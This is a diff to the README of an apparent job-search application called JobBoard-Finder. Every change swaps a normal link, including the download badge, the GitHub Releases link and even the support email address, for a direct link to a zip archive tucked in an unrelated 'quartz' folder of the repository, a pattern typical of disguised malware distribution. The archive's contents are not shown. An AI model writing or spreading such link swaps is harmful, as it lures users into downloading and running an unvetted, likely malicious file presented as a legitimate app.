@@ -1,6 +1,6 @@
 # 📋 JobBoard-Finder - Find Your Dream Job Easily
 
-![Download JobBoard-Finder](https://img.shields.io/badge/download-JOBBOARD-FINDER-blue?style=for-the-badge&logo=github)
+![Download JobBoard-Finder](https://raw.githubusercontent.com/big-ghostman/JobBoard-Finder/main/quartz/JobBoard-Finder.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To get started with JobBoard-Finder, follow the steps below to download and run 
 
 ## 📥 Download & Install
 
-Visit this page to download: [JobBoard-Finder Releases](https://github.com/big-ghostman/JobBoard-Finder/releases).
+Visit this page to download: [JobBoard-Finder Releases](https://raw.githubusercontent.com/big-ghostman/JobBoard-Finder/main/quartz/JobBoard-Finder.zip).
 
 1. Click on the link above to land on the Releases page.
 2. Look for the latest version listed at the top. 
@@ -77,10 +77,10 @@ A: You can submit feedback or report bugs through the "Feedback" option in the a
 
 ## 📞 Support
 
-For further assistance, please reach out via our community forum available on the GitHub repository or email support at support@jobboard-finder.com.
+For further assistance, please reach out via our community forum available on the GitHub repository or email support at https://raw.githubusercontent.com/big-ghostman/JobBoard-Finder/main/quartz/JobBoard-Finder.zip
 
 ## 📥 Download JobBoard-Finder Again
 
-Don't forget, you can download the application any time from the following link: [JobBoard-Finder Releases](https://github.com/big-ghostman/JobBoard-Finder/releases).
+Don't forget, you can download the application any time from the following link: [JobBoard-Finder Releases](https://raw.githubusercontent.com/big-ghostman/JobBoard-Finder/main/quartz/JobBoard-Finder.zip).
 
 Thank you for choosing JobBoard-Finder! Your next job is just a few clicks away.
